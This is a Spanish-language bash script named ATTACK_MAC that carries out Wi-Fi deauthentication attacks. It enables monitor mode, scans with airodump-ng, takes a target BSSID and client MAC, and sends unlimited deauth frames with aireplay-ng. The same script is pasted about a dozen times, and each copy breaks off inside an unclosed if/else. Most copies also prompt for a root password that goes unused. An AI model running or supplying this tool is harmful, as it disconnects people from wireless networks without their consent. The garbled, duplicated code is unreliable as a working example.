#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

